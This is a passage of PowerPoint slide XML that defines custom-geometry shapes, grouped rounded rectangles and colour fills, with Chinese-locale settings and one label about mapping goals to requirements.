                <a:gd name="T6" fmla="*/ 134217728 w 2"/>
                <a:gd name="T7" fmla="*/ 0 h 2"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 2"/>
                <a:gd name="T13" fmla="*/ 0 h 2"/>
                <a:gd name="T14" fmla="*/ 2 w 2"/>
                <a:gd name="T15" fmla="*/ 2 h 2"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="2" h="2">
                  <a:moveTo>
                    <a:pt x="2" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="148" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="413" y="103"/>
              <a:ext cx="17" cy="13"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 14"/>
                <a:gd name="T1" fmla="*/ 420 h 11"/>
                <a:gd name="T2" fmla="*/ 2283 w 14"/>
                <a:gd name="T3" fmla="*/ 819 h 11"/>
                <a:gd name="T4" fmla="*/ 1631 w 14"/>
                <a:gd name="T5" fmla="*/ 420 h 11"/>
                <a:gd name="T6" fmla="*/ 625 w 14"/>
                <a:gd name="T7" fmla="*/ 0 h 11"/>
                <a:gd name="T8" fmla="*/ 0 w 14"/>
                <a:gd name="T9" fmla="*/ 420 h 11"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 w 14"/>
                <a:gd name="T16" fmla="*/ 0 h 11"/>
                <a:gd name="T17" fmla="*/ 14 w 14"/>
                <a:gd name="T18" fmla="*/ 11 h 11"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T10">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T12">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T15" t="T16" r="T17" b="T18"/>
              <a:pathLst>
                <a:path w="14" h="11">
                  <a:moveTo>
                    <a:pt x="0" y="6"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="6"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="149" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="419" y="102"/>
              <a:ext cx="15" cy="19"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2713 w 12"/>
                <a:gd name="T1" fmla="*/ 0 h 17"/>
                <a:gd name="T2" fmla="*/ 4001 w 12"/>
                <a:gd name="T3" fmla="*/ 135 h 17"/>
                <a:gd name="T4" fmla="*/ 3391 w 12"/>
                <a:gd name="T5" fmla="*/ 295 h 17"/>
                <a:gd name="T6" fmla="*/ 2170 w 12"/>
                <a:gd name="T7" fmla="*/ 169 h 17"/>
                <a:gd name="T8" fmla="*/ 0 w 12"/>
                <a:gd name="T9" fmla="*/ 2 h 17"/>
                <a:gd name="T10" fmla="*/ 0 w 12"/>
                <a:gd name="T11" fmla="*/ 0 h 17"/>
                <a:gd name="T12" fmla="*/ 2713 w 12"/>
                <a:gd name="T13" fmla="*/ 0 h 17"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                <a:gd name="T21" fmla="*/ 0 w 12"/>
                <a:gd name="T22" fmla="*/ 0 h 17"/>
                <a:gd name="T23" fmla="*/ 12 w 12"/>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17">
                  <a:moveTo>
                    <a:pt x="8" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="150" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="313" y="48"/>
              <a:ext cx="52" cy="55"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 40"/>
                <a:gd name="T1" fmla="*/ 266 h 47"/>
                <a:gd name="T2" fmla="*/ 21338 w 40"/>
                <a:gd name="T3" fmla="*/ 799 h 47"/>
                <a:gd name="T4" fmla="*/ 8691 w 40"/>
                <a:gd name="T5" fmla="*/ 2809 h 47"/>
                <a:gd name="T6" fmla="*/ 29687 w 40"/>
                <a:gd name="T7" fmla="*/ 2051 h 47"/>
                <a:gd name="T8" fmla="*/ 36521 w 40"/>
                <a:gd name="T9" fmla="*/ 584 h 47"/>
                <a:gd name="T10" fmla="*/ 21338 w 40"/>
                <a:gd name="T11" fmla="*/ 0 h 47"/>
                <a:gd name="T12" fmla="*/ 0 w 40"/>
                <a:gd name="T13" fmla="*/ 266 h 47"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                <a:gd name="T21" fmla="*/ 0 w 40"/>
                <a:gd name="T22" fmla="*/ 0 h 47"/>
                <a:gd name="T23" fmla="*/ 40 w 40"/>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47">
                  <a:moveTo>
                    <a:pt x="0" y="4"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="23" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="32" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="C0C0C0"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="151" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="285" y="52"/>
              <a:ext cx="59" cy="59"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 20892 w 46"/>
                <a:gd name="T1" fmla="*/ 5499 h 49"/>
                <a:gd name="T2" fmla="*/ 29654 w 46"/>
                <a:gd name="T3" fmla="*/ 1139 h 49"/>
                <a:gd name="T4" fmla="*/ 15090 w 46"/>
                <a:gd name="T5" fmla="*/ 0 h 49"/>
                <a:gd name="T6" fmla="*/ 0 w 46"/>
                <a:gd name="T7" fmla="*/ 566 h 49"/>
                <a:gd name="T8" fmla="*/ 0 w 46"/>
                <a:gd name="T9" fmla="*/ 1139 h 49"/>
                <a:gd name="T10" fmla="*/ 15090 w 46"/>
                <a:gd name="T11" fmla="*/ 1651 h 49"/>
                <a:gd name="T12" fmla="*/ 16289 w 46"/>
                <a:gd name="T13" fmla="*/ 6059 h 49"/>
                <a:gd name="T14" fmla="*/ 20892 w 46"/>
                <a:gd name="T15" fmla="*/ 5499 h 49"/>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49"/>
                <a:gd name="T26" fmla="*/ 46 w 46"/>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49">
                  <a:moveTo>
                    <a:pt x="32" y="43"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="46" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="32" y="43"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="152" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="317" y="79"/>
              <a:ext cx="92" cy="33"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 26718 w 73"/>
                <a:gd name="T1" fmla="*/ 694 h 29"/>
                <a:gd name="T2" fmla="*/ 24940 w 73"/>
                <a:gd name="T3" fmla="*/ 471 h 29"/>
                <a:gd name="T4" fmla="*/ 29860 w 73"/>
                <a:gd name="T5" fmla="*/ 217 h 29"/>
                <a:gd name="T6" fmla="*/ 24940 w 73"/>
                <a:gd name="T7" fmla="*/ 2 h 29"/>
                <a:gd name="T8" fmla="*/ 13889 w 73"/>
                <a:gd name="T9" fmla="*/ 0 h 29"/>
                <a:gd name="T10" fmla="*/ 12346 w 73"/>
                <a:gd name="T11" fmla="*/ 217 h 29"/>
                <a:gd name="T12" fmla="*/ 0 w 73"/>
                <a:gd name="T13" fmla="*/ 782 h 29"/>
                <a:gd name="T14" fmla="*/ 18800 w 73"/>
                <a:gd name="T15" fmla="*/ 848 h 29"/>
                <a:gd name="T16" fmla="*/ 21762 w 73"/>
                <a:gd name="T17" fmla="*/ 694 h 29"/>
                <a:gd name="T18" fmla="*/ 26718 w 73"/>
                <a:gd name="T19" fmla="*/ 694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3"/>
                <a:gd name="T31" fmla="*/ 0 h 29"/>
                <a:gd name="T32" fmla="*/ 73 w 73"/>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3" h="29">
                  <a:moveTo>
                    <a:pt x="65" y="25"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="61" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65" y="25"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="153" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="285" y="5"/>
              <a:ext cx="151" cy="27"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 119"/>
                <a:gd name="T1" fmla="*/ 1552 h 23"/>
                <a:gd name="T2" fmla="*/ 8689 w 119"/>
                <a:gd name="T3" fmla="*/ 708 h 23"/>
                <a:gd name="T4" fmla="*/ 18364 w 119"/>
                <a:gd name="T5" fmla="*/ 271 h 23"/>
                <a:gd name="T6" fmla="*/ 28894 w 119"/>
                <a:gd name="T7" fmla="*/ 0 h 23"/>
                <a:gd name="T8" fmla="*/ 39966 w 119"/>
                <a:gd name="T9" fmla="*/ 271 h 23"/>
                <a:gd name="T10" fmla="*/ 49225 w 119"/>
                <a:gd name="T11" fmla="*/ 708 h 23"/>
                <a:gd name="T12" fmla="*/ 58403 w 119"/>
                <a:gd name="T13" fmla="*/ 1552 h 23"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                <a:gd name="T21" fmla="*/ 0 w 119"/>
                <a:gd name="T22" fmla="*/ 0 h 23"/>
                <a:gd name="T23" fmla="*/ 119 w 11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9" h="23">
                  <a:moveTo>
                    <a:pt x="0" y="23"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="17" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="82" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="23"/>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60" name="组合 159"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3601467" y="3370673"/>
            <a:ext cx="3246436" cy="842962"/>
            <a:chOff x="3601467" y="3370673"/>
            <a:chExt cx="3246436" cy="842962"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Line 2"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5366766" y="3589748"/>
              <a:ext cx="15875" cy="62388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AutoShape 40"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4193604" y="3375435"/>
              <a:ext cx="2654299" cy="576263"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd name="adj" fmla="val 16667"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="DDDDDD"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="DDDDDD"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3601467" y="3370673"/>
              <a:ext cx="1611313" cy="623887"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T2" fmla="*/ 0 w 1059"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T8" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T9" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T10" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T11" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T12" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T13" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T14" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T15" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T16" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T17" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T18" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T19" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T20" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T21" fmla="*/ 2147483647 h 447"/>
                <a:gd name="T22" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T23" fmla="*/ 0 h 447"/>
                <a:gd name="T24" fmla="*/ 2147483647 w 1059"/>
                <a:gd name="T25" fmla="*/ 2147483647 h 4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59"/>
                <a:gd name="T40" fmla="*/ 0 h 447"/>
                <a:gd name="T41" fmla="*/ 1059 w 1059"/>
                <a:gd name="T42" fmla="*/ 447 h 4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59" h="447">
                  <a:moveTo>
                    <a:pt x="135" y="12"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1059" y="351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1008" y="288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="921" y="237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="843" y="168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="666" y="123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="678" y="141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="480" y="75"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135" y="12"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="CC99FF">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nvGrpSpPr>
            <p:cNvPr id="13" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4331717" y="3656423"/>
              <a:ext cx="266700" cy="165100"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="432" cy="351"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="117" name="AutoShape 44"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="78" y="0"/>
                <a:ext cx="354" cy="270"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 16667"/>
                </a:avLst>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="FF99CC"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="118" name="AutoShape 45"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="39" y="41"/>
                <a:ext cx="354" cy="270"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 16667"/>
                </a:avLst>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="FF99CC"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="119" name="AutoShape 46"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="81"/>
                <a:ext cx="354" cy="270"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 16667"/>
                </a:avLst>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="FF99CC"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="Rectangle 47"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4666679" y="3423060"/>
              <a:ext cx="152400" cy="179388"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFCC66"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5311204" y="3516723"/>
              <a:ext cx="1439862" cy="20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lnSpc>
                  <a:spcPct val="85000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>目标映射至要求</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="16" name="Group 49"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4620641" y="3661185"/>
              <a:ext cx="247650" cy="155575"/>
